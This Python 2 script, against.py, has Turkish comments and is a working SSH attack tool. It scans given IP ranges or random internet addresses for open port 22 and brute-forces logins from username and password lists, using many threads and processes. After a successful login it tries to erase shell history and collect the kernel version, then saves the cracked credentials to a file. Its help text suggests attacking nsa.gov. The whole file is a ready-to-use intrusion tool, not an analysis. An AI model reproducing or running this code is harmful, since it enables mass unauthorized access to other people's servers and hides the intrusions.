#!/usr/bin/env python
# -*- coding: utf-8 -*-

from socket import *
import multiprocessing
import threading
import time
import paramiko
import sys
import os
import logging
import argparse
import random
import re


# versiyon bilgisi against.py
VERSION = 'v0.1'


# güzel bir banner ;)
def banner():
    print "twitter:delosemre"
    print "instagram:delosemree"
    print "delosemre@outlook.com"
# versiyonu yazdır
def version():
    print '[+] against.py %s' % (VERSION)
    sys.exit(0)

# Dosyaya yazıp yazamayacağımızı kontrol et
def test_file(filename):
    try:
        outfile = open(filename, 'a')
        outfile.close()
    except IOError:
        print '[!] HATA: dosyaya yazamıyor \'%s\'' % filename
        sys.exit(1)

# Komut satırı parametrelerini ve yardım sayfasını tanımlar
def argspage():
    parser = argparse.ArgumentParser(
    usage = '\n\n   ./%(prog)s -i <arg> | -r <arg> | -I <arg>',
    formatter_class = argparse.RawDescriptionHelpFormatter,
    epilog =
    'Örnekler:\n\n'

    '  Tek bir hedefe saldır\n'
    '  Örnek: ./%(prog)s -i nsa.gov -L şifreler.txt\n\n'

    '  Bir ip aralığına tarama ve saldırma\n'
    '  Örnek: ./%(prog)s -i 192.168.0-10.1-254 -u admin -l troll -s 500',
    add_help = False
    )

    options = parser.add_argument_group('seçenekler', '')
    options.add_argument('-i', default=False, metavar='<ip/range>',
            help='ip adres/ip aralığı/alan (e.g.: 192.168.0-3.1-254)')
    options.add_argument('-I', default=False, metavar='<file>',
            help='Hedef listesi')
    options.add_argument('-r', default=False, metavar='<num>',
            help='Rasgele host saldırısı')
    options.add_argument('-p', default=22, metavar='<num>',
            help='sshd port numarası (varsayılan: 22)')
    options.add_argument('-t', default=4, metavar='<num>',
            help='Host başına ipler (varsayılan: 4)')
    options.add_argument('-f', default=8, metavar='<num>',
            help='Saldırı max host paralel (varsayılan: 8)')
    options.add_argument('-u', default='root', metavar='<kullanıcı adı>',
            help='Tek kullanıcı adı (varsayılan: root)')
    options.add_argument('-U', default=False, metavar='<dosya>',
            help='Kullanıcı adları listesi')
    options.add_argument('-l', default='toor', metavar='<şifreler>',
            help='Tek şifre (varsayılan: toor)')
    options.add_argument('-L', default=False, metavar='<dosya>',
            help='Şifre listesi')
    options.add_argument('-o', default=False, metavar='<dosya>',
            help='Bulunulan oturumları dosyaya yaz')
    options.add_argument('-O', default=False, metavar='<dosya>',
            help='Bulunan hedef ip adreslerini dosyaya yaz')
    options.add_argument('-s', default=200, metavar='<num>',
            help='Bağlantı noktası tarama iş parçacıkları (varsayılan: 200)')
    options.add_argument('-T', default=3, metavar='<sec>',
            help='Saniye cinsinden zaman aşımı (varsayılan: 3)')
    options.add_argument('-V', action='store_true',
            help='against.py sürümünü yazdır ve çık')

    args = parser.parse_args()

    if args.V:
        version()

    if (args.i == False) and (args.I == False) and (args.r == False):
        print ''
        parser.print_help()
        sys.exit(0)

    return args

# Dosyaya ip adresleri / girişleri yaz
def write_to_file(filename, text):
    outfile = open(filename, 'a')
    outfile.write(text)
    outfile.close()

# Hedefe bağlanın ve açık bir bağlantı noktası olup olmadığını kontrol edin
def scan(target, port, timeout, oips):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((target, port))
    sock.close()
    if result == 0:
        HOSTLIST.append(target)
        if oips:
            write_to_file(oips, target + '\n')

# Azami ileti sayısını kontrol et
def active_threads(threads, waittime):
    while threading.activeCount() > threads:
        time.sleep(waittime)

# create thread and call scan()
def thread_scan(args, target):
    port = int(args.p)
    timeout = float(args.T)
    oips = args.O
    threads = int(args.s)

    bam = threading.Thread(target=scan, args=(target, port, timeout, oips))
    bam.start()

    active_threads(threads, 0.0001)
    time.sleep(0.001)

# Hedefleri tararken yalnızca çıktı
def scan_output(i):
    sys.stdout.flush()
    sys.stdout.write('\r[*] host tarandı: {0} | ' \
            'Saldırıya: {1}'.format(i, len(HOSTLIST)))

# Verilen hedef (ler) in biçimini işle
def check_targets(targets):
    if re.match(r'^[0-9.\-]*$', targets):
        return targets
    try:
        target = gethostbyname(targets)
        return target
    except gaierror:
        print '[-] \'%s\' ulaşılamaz' % (targets)
        finished()
        sys.exit(1)

# Artımlı tarama nedeniyle bulunan ana makineleri sıralandır
def unsort_hostlist():
    print '[*] Ana makine listesinin sıralamasını değiştir'
    for i in range(15):
        random.shuffle(HOSTLIST)

# Komut satırından ip aralığı biçimini işle
def handle_ip_range(iprange):
    parted = tuple(part for part in iprange.split('.'))

    rsa = range(4)
    rsb = range(4)
    for i in range(4):
        hyphen = parted[i].find('-')
        if hyphen != -1:
            rsa[i] = int(parted[i][:hyphen])
            rsb[i] = int(parted[i][1+hyphen:]) + 1
        else:
            rsa[i] = int(parted[i])
            rsb[i] = int(parted[i]) + 1

    return (rsa, rsb)

# Hedef ip adresleriyle thread_scan () çağrısı
def ip_range(args):
    targets = check_targets(args.i)
    rsa, rsb = handle_ip_range(targets)

    print '[*] tarama %s Ssh hizmetleri için' % targets
    counter = 0
    for i in range(rsa[0], rsb[0]):
        for j in range(rsa[1], rsb[1]):
            for k in range(rsa[2], rsb[2]):
                for l in range(rsa[3], rsb[3]):
                    target = '%d.%d.%d.%d' % (i, j, k, l)
                    counter += 1
                    scan_output(counter)
                    thread_scan(args, target)

    # Son çalıştıran iş parçacıklarını beklemek
    active_threads(1, 0.1)

    scan_output(counter)
    print '\n[*] Tarama bitti.'

# Ip adresleri yarat
def randip():
    rand = range(4)
    for i in range(4):
        rand[i] = random.randrange(0, 256)

    # dışlamak 127.x.x.x
    if rand[0] == 127:
        randip()

    ipadd = '%d.%d.%d.%d' % (rand[0], rand[1], rand[2], rand[3])
    return ipadd

# Rastgele ip adresleri yarat
def rand_ip(args):
    i = 0
    print '[*] Ssh hizmetleri için rasgele ips tarama'
    while len(HOSTLIST) < int(args.r):
        i += 1
        scan_output(i)
        thread_scan(args, randip())

    # waiting for the last running threads
    active_threads(1, 1)

    scan_output(i)
    print '\n[*] Tarama bitti.'

# checks if given filename by parameter exists
def file_exists(filename):
    try:
        open(filename).readlines()
    except IOError:
        print '[!] HATA: dosya açılamıyor \'%s\'' % filename
        sys.exit(1)

# read-in a file with ip addresses
def ip_list(ipfile):
    file_exists(ipfile)
    targets = open(ipfile).readlines()
    for target in targets:
        HOSTLIST.append(target)

# connect to target and try to login
def crack(target, port, user, passwd, outfile, timeo, i):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    user = user.replace('\n', '')
    passwd = passwd.replace('\n', '')
    try:
        ssh.connect(target, port=port, username=user, password=passwd,
                timeout=timeo, pkey=None, allow_agent=False)
        time.sleep(3)
        try:
            ssh.exec_command('HISTFILEı kaldır; Unset HISTSIZE')
            time.sleep(1)
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('uname -a ' \
                    '|| cat /proc/version')
            output = 'kernel: %s' \
                    % (ssh_stdout.readlines()[0].replace('\n', ''))
        except:
            output = 'Info: belki de bir honeypot veya yanlış pozitif'
        login = '[+] Için giriş bulundu %s | %s:%s\n' \
                '[!] %s' % (target, user, passwd, output)
        print login
        if outfile:
            write_to_file(outfile, login + '\n')
        ssh.close()
        os._exit(0)
    except paramiko.AuthenticationException, e:
        ssh.close()
        exception = str(e)
        if '[\'publickey\']' in exception:
            print '[-] Yalnızca ana kimlik doğrulama - ' \
                'Karşı saldırı durdurdu %s' % (target)
            os._exit(1)
        elif '\'keyboard-interactive\'' in exception:
            print '[-] %s gerektirir \'klavye etkileşimli\' işleyicisi' % (target)
            os._exit(1)
    except:
        ssh.close()
        # after 3 timeouts per request the attack against $target will stopped
        if i < 3:
            i += 1
            # reconnect after random seconds (between 0.6 and 1.2 sec)
            randtime = random.uniform(0.6, 1.2)
            time.sleep(randtime)
            crack(target, port, user, passwd, outfile, timeo, i)
        else:
            print '[-] Çok fazla zaman aşımı - saldırıya karşı durdu %s' % (target)
            os._exit(1)

# create 'x' number of threads and call crack()
def thread_it(target, args):
    port = int(args.p)
    user = args.u
    userlist = args.U
    password = args.l
    passlist = args.L
    outfile = args.o
    timeout = float(args.T)
    threads = int(args.t)

    if userlist:
        users = open(userlist).readlines()
    else:
        users = [user]
    if passlist:
        passwords = open(passlist).readlines()
    else:
        passwords = [password]

    # try/except looks dirty but we need it :/
    try:
        for user in users:
            for password in passwords:
                Run = threading.Thread(target=crack, args=(target, port, user,
                    password, outfile, timeout, 0,))
                Run.start()
                # checks that we a max number of threads
                active_threads(threads, 0.01)
                time.sleep(0.1)
        # waiting for the last running threads
        active_threads(1, 1)
    except KeyboardInterrupt:
        os._exit(1)

# create 'x' child processes (child == cracking routine for only one target)
def fork_it(args):
    threads = int(args.t)
    childs = int(args.f)
    len_hosts = len(HOSTLIST)

    print '[*] saldırma %d hedef(s)\n' \
            '[*] Kadar çatlamak %d host sahip\n' \
            '[*] threads per host: %d' % (len_hosts, childs, threads)

    i = 1
    for host in HOSTLIST:
        host = host.replace('\n', '')
        print '[*] Karşı saldırı gerçekleştirmek %s [%d/%d]' % (host, i, len_hosts)
        hostfork = multiprocessing.Process(target=thread_it, args=(host, args))
        hostfork.start()
        # checks that we have a max number of childs
        while len(multiprocessing.active_children()) >= childs:
            time.sleep(0.001)
        time.sleep(0.001)
        i += 1

    # waiting for child processes
    while multiprocessing.active_children():
        time.sleep(1)

# \(0.o)/
def empty_hostlist():
    if len(HOSTLIST) == 0:
        print '[-] Saldırılacak hedef bulamadı!'
        finished()
        sys.exit(1)

# output when against.py finished all routines
def finished():
    print '[*] oyun bitti!!!'

def main():
    banner()
    args = argspage()

    if args.U:
        file_exists(args.U)
    if args.L:
        file_exists(args.L)
    if args.o:
        test_file(args.o)
    if args.O:
        test_file(args.O)

    if args.i:
        ip_range(args)
        unsort_hostlist()
    elif args.I:
        ip_list(args.I)
    else:
        rand_ip(args)

    time.sleep(0.1)
    empty_hostlist()
    fork_it(args)
    finished()

if __name__ == '__main__':
    HOSTLIST = []
    try:
        logging.disable(logging.CRITICAL)
        main()
    except KeyboardInterrupt:
        print '\ngüle güle!!!'
        time.sleep(0.2)
        os._exit(1)
